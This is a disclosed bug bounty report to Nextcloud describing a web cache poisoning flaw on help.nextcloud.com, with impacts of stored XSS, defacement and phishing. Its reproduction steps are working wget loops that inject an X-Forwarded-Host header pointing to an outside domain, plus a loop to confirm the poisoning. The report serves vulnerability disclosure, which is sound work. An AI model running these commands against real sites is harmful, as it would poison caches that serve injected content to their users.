# https://help.nextcloud.com::: Web cache poisoning attack

## Report Details
- **Report ID**: 429747
- **URL**: https://hackerone.com/reports/429747
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-10-27T19:33:02.896Z
- **Disclosed**: 2020-01-31T19:08:52.345Z

## Reporter
- **Username**: g4mm4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi there,
I just found the website:
https://help.nextcloud.com
is infected with "Web cache poisoning"
Abuse this bug, Attacker can:
1. Poison your cache with HTTP header with XSS included. This attack may leads to Stored XSS
2. Poison your website contains malware url (cache poisoned by attacker), maybe the user's browser (like Firefox, Chrome) will block your website (https://help.nextcloud.com)

How to reproduce the issue:

    In the 1st terminal, run command likes this: 
$ while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done
    In the 2nd terminal, run command below for confirmation this attack is successful: 
while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done

Finally, this link bellow: https://help.nextcloud.com/?qwKzzSR=649227948379 was infected with "Web Cache poisoning attack".
Please see the attached image for details.

Impact
Stored XSS attack, deface website ....
Cheers,
~g4mm4

## Impact

Stored XSS attack, deface website, phishing for funs :)

## Attachments
- PoC2.png
- PoC1.png
- PoC3.png
